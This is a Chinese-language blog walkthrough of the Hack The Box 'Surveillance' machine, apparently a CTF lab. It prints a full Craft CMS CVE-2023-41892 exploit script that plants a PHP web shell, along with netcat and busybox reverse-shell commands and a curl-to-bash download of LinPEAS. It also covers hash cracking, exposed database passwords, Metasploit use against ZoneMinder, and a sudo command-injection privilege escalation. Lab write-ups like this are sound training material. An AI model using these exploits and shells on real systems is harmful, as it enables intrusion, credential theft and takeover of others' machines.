<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>HTB | Surveillance CVE-2023-41892 CVE-2023-26035 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="HTB | Surveillance CVE-2023-41892 CVE-2023-26035" />
<meta property="og:description" content="HTB | Surveillance CVE-2023-41892 CVE-2023-26035 使用nmap进行端口扫描
nmap -sV -sC -v -oN Surveillance.log 10.10.11.245 # Nmap 7.93 scan initiated Mon Dec 18 08:57:23 2023 as: nmap -sV -sC -v -oN Surveillance.log 10.10.11.245 Nmap scan report for 10.10.11.245 Host is up (0.56s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 96071cc6773e07a0cc6f2419744d570b (ECDSA) |_ 256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519) 80/tcp open http nginx 1." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/f5cf806796029dc0c146f099ae9fc8fe/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-24T23:33:46+08:00" />
<meta property="article:modified_time" content="2023-12-24T23:33:46+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">HTB | Surveillance CVE-2023-41892 CVE-2023-26035</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h4><a id="HTB__Surveillance_CVE202341892_CVE202326035_0"></a>HTB | Surveillance CVE-2023-41892 CVE-2023-26035</h4> 
<p>使用nmap进行端口扫描</p> 
<pre><code>nmap -sV -sC -v -oN Surveillance.log 10.10.11.245  
</code></pre> 
<pre><code># Nmap 7.93 scan initiated Mon Dec 18 08:57:23 2023 as: nmap -sV -sC -v -oN Surveillance.log 10.10.11.245
Nmap scan report for 10.10.11.245
Host is up (0.56s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
1080/tcp open  socks5  (Username/password authentication required)
| socks-auth-info: 
|   No authentication
|   No authentication
|_  Username and password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 18 08:58:03 2023 -- 1 IP address (1 host up) scanned in 39.68 seconds
</code></pre> 
<p>使用gobuster进行目录扫描</p> 
<pre><code>gobuster dir -u http://surveillance.htb --wordlist=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -q -t 200 -x .php,.zip,.txt,.html
</code></pre> 
<p>使用谷歌搜索craft cms 4.4.14 rce 找到**<a href="https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226" rel="nofollow">CVE-2023-41892</a>**</p> 
<pre><code>import requests
import re
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
}

def writePayloadToTempFile(documentRoot):

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
    }

    files = {
        "image1": ("pwn1.msl", """&lt;?xml version="1.0" encoding="UTF-8"?&gt;
        &lt;image&gt;
        &lt;read filename="caption:&amp;lt;?php @system(@$_REQUEST['cmd']); ?&amp;gt;"/&gt;
        &lt;write filename="info:DOCUMENTROOT/cpresources/shell.php" /&gt;
        &lt;/image&gt;""".replace("DOCUMENTROOT", documentRoot), "text/plain")
    }

    response = requests.post(url, headers=headers, data=data, files=files)

def getTmpUploadDirAndDocumentRoot():
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
    }

    response = requests.post(url, headers=headers, data=data, proxies={"http": "http://127.0.0.1:8080"})

    pattern1 = r'&lt;tr&gt;&lt;td class="e"&gt;upload_tmp_dir&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;'
    pattern2 = r'&lt;tr&gt;&lt;td class="e"&gt;\$_SERVER\[\'DOCUMENT_ROOT\'\]&lt;\/td&gt;&lt;td class="v"&gt;([^&lt;]+)&lt;\/td&gt;&lt;\/tr&gt;'
   
    match1 = re.search(pattern1, response.text, re.DOTALL)
    match2 = re.search(pattern2, response.text, re.DOTALL)
    return match1.group(1), match2.group(1)

def trigerImagick(tmpDir):
    
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
    }
    response = requests.post(url, headers=headers, data=data)    

def shell(cmd):
    response = requests.get(url + "/cpresources/shell.php", params={"cmd": cmd})
    match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)

    if match:
        extracted_text = match.group(1).strip()
        print(extracted_text)
    else:
        return None
    return extracted_text

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print("Usage: python CVE-2023-41892.py &lt;url&gt;")
        exit()
    else:
        url = sys.argv[1]
        print("[-] Get temporary folder and document root ...")
        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
        tmpDir = "/tmp" if "no value" in upload_tmp_dir else upload_tmp_dir
        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(tmpDir)
        except:
            pass

        print("[-] Done, enjoy the shell")
        while True:
            cmd = input("$ ")
            shell(cmd)
</code></pre> 
<p>使用python执行POC,直接上线web权限</p> 
<pre><code>python CVE-2023-41892.py http://surveillance.htb
</code></pre> 
<p><img src="https://images2.imgbox.com/1c/8a/VzRaRig1_o.png" alt="在这里插入图片描述"></p> 
<p>查看目录文件及用户id</p> 
<p><img src="https://images2.imgbox.com/31/f1/gtNiizuq_o.png" alt="在这里插入图片描述"></p> 
<p>反弹个nc维持稳定远程权限</p> 
<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.3 5566  &gt;/tmp/f
</code></pre> 
<p><img src="https://images2.imgbox.com/47/62/mGEP0SOL_o.png" alt="在这里插入图片描述"></p> 
<p>在/var/www/html/craft/storage/backups中发现一个sql的压缩包，使用python开启http服务，访问并下载文件</p> 
<pre><code>python3 -m http.server 1144
</code></pre> 
<p><img src="https://images2.imgbox.com/35/fd/oqdfJH82_o.png" alt="在这里插入图片描述"></p> 
<p>在sql备份文件中发现一个hash值</p> 
<pre><code>echo “39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec” &gt; hash
</code></pre> 
<p><img src="https://images2.imgbox.com/67/18/jHyz14uE_o.png" alt="在这里插入图片描述"></p> 
<p>使用hash-identifier识别hash属性，识别出来为SHA-256,Haval-256</p> 
<pre><code>hash-identifier
</code></pre> 
<p><img src="https://images2.imgbox.com/3c/b0/yw6pv8lC_o.png" alt="在这里插入图片描述"></p> 
<p>使用hashcat 进行爆破</p> 
<pre><code>hashcat -m 1400 hash  /usr/share/wordlists/rockyou.txt
</code></pre> 
<pre><code>starcraft122490
</code></pre> 
<p><img src="https://images2.imgbox.com/cb/31/0BRuJkAX_o.png" alt="在这里插入图片描述"></p> 
<p>登录到matthew用户</p> 
<pre><code>ssh matthew@10.10.11.245 
</code></pre> 
<p><img src="https://images2.imgbox.com/45/1c/DIJi2Z5K_o.png" alt="在这里插入图片描述"></p> 
<p>user flag</p> 
<pre><code>0c7e023577d0e134ff4ddd0cf687d448
</code></pre> 
<p>查看内核版本</p> 
<pre><code>uname -a
cat /proc/version
ubuntu 5.15
</code></pre> 
<p><img src="https://images2.imgbox.com/91/c8/sfIMAZFy_o.png" alt="在这里插入图片描述"></p> 
<p>使用python开启http服务使用LinPEAS找隐私信息</p> 
<pre><code>curl http://10.10.16.3:4455/linpeas.sh | bash
</code></pre> 
<p><img src="https://images2.imgbox.com/52/e9/618k7FsO_o.png" alt="在这里插入图片描述"></p> 
<p>数据库密码</p> 
<pre><code>ZoneMinderPassword2023
</code></pre> 
<p><img src="https://images2.imgbox.com/60/70/k9mzBnft_o.png" alt="在这里插入图片描述"></p> 
<p>数据库密码</p> 
<pre><code>CraftCMSPassword2023!
</code></pre> 
<p><img src="https://images2.imgbox.com/b2/b0/Ekd6XZja_o.png" alt="在这里插入图片描述"></p> 
<p>登录到mysql</p> 
<pre><code>mysql -u craftuser -D craftdb -pCraftCMSPassword2023!
</code></pre> 
<p>查询表单</p> 
<pre><code>show tables;
</code></pre> 
<p><img src="https://images2.imgbox.com/0f/b4/eEyvFXiB_o.png" alt="在这里插入图片描述"></p> 
<p>查询字段</p> 
<pre><code>select  * from users;
</code></pre> 
<p><img src="https://images2.imgbox.com/41/0b/Kgdh1r6E_o.png" alt="在这里插入图片描述"></p> 
<p>看到一个hash</p> 
<pre><code>$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe
</code></pre> 
<p>使用john进行爆破</p> 
<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt  hash 
</code></pre> 
<p>爆破失败</p> 
<p>使用linpeas扫描发现开启了8080端口</p> 
<p><img src="https://images2.imgbox.com/e8/b8/Ajjn9K6d_o.png" alt="在这里插入图片描述"></p> 
<p>使用ssh进行端口转发至本地</p> 
<pre><code>ssh -L 8080:localhost:8080 matthew@10.10.11.245
</code></pre> 
<p><img src="https://images2.imgbox.com/2d/ba/oIurepSI_o.png" alt="在这里插入图片描述"></p> 
<p>本机访问8080端口</p> 
<p><img src="https://images2.imgbox.com/39/d7/WPq8y5ve_o.png" alt="在这里插入图片描述"></p> 
<p>在谷歌搜索</p> 
<pre><code>zoneminder exploit
</code></pre> 
<p><img src="https://images2.imgbox.com/c7/3a/te5fn7Mw_o.png" alt="在这里插入图片描述"></p> 
<p>搜索到**<a href="https://github.com/rvizx/CVE-2023-26035">CVE-2023-26035</a>**漏洞</p> 
<p>网上现成的exp</p> 
<pre><code>git clone https://github.com/rvizx/CVE-2023-26035.git
cd CVE-2023-26035
python exploit.py -t "http://127.0.0.1:8080/index.php" -ip 10.10.16.16 -p 5566
</code></pre> 
<p><img src="https://images2.imgbox.com/61/c3/myCIK1mt_o.png" alt="在这里插入图片描述"></p> 
<p>这里我们使用的是metasploit</p> 
<pre><code>msfconsole 
use exploit/unix/webapp/zoneminder_snapshots 
show options 
set rhosts 127.0.0.1
set rport 8080
set targeturi /index.php/
set lhost 10.10.16.16
exploit
</code></pre> 
<p><img src="https://images2.imgbox.com/1c/06/xaKmkWkj_o.png" alt="在这里插入图片描述"></p> 
<p>进入目标主机cmd</p> 
<pre><code>shell
whoami
script /dev/null -c bash
sudo -l
</code></pre> 
<p><img src="https://images2.imgbox.com/91/b8/O2ZqWHMB_o.png" alt="在这里插入图片描述"></p> 
<p>使用python 临时开启http服务传输shell脚本进行反弹</p> 
<p>BusyBox 是一个<strong>集成了三百多个最常用Linux命令和工具的软件</strong>。 BusyBox 包含了一些简单的工具，例如ls、cat和echo等等，还包含了一些更大、更复杂的工具，例grep、find、mount以及telnet。 有些人将 BusyBox 称为 Linux 工具里的瑞士军刀</p> 
<pre><code>#!/bin/bash
busybox nc 10.10.16.16 5566 -e sh
</code></pre> 
<p>使用sudo执行shell脚本 pass中的密码是上文linpeas找到的</p> 
<pre><code>sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/shell1.sh)' --pass=ZoneMinderPassword2023
</code></pre> 
<p>nc开启监听上线</p> 
<p><img src="https://images2.imgbox.com/4a/7f/RoQ0V5k2_o.png" alt="在这里插入图片描述"></p> 
<pre><code>ec2fb16d285ebcb18e1a5e1725587b9c
</code></pre> 
<p>1888吉利数保存一下</p> 
<p><img src="https://images2.imgbox.com/19/4c/wIW9EwZT_o.png" alt="在这里插入图片描述"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/c88201105986969512983c42bbd5f715/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">四. 基于环视Camera的BEV感知算法-PETR</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/692aa8ad7d97415301e037ab60521971/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Apache Commons Math: 面向Java的数学和统计库</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>